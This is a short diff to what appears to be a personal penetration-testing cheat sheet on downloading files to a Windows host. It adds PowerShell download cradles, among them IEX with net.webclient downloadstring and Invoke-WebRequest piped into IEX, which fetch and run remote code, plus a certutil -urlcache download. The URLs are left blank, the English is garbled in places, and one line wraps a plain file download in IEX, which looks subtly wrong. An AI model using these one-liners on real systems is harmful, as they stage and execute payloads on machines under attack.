@@ -1,6 +1,16 @@
 download files 
-to download file without run it :IEX(new-object net.webclient).downloadfile('','name of saved file')
-to download file and run it : IEX(new-object net.webclient).downloadstring('')
+to download file without run it :
+1-IEX(new-object net.webclient).downloadfile('','path and name of saved file be attention for permission ') 
+>>>>> ind=side powershell dont use IEX with it 
+2- IEX (iwr <source> -OutFile <destination>)
+
+
+to download file and run it : 
+IEX(new-object net.webclient).downloadstring('') 
+IEX(IWR source -UseBasicParsing)
+
+
+ 
 to download files use certutil -urlcache -split -f url dest 
 
 
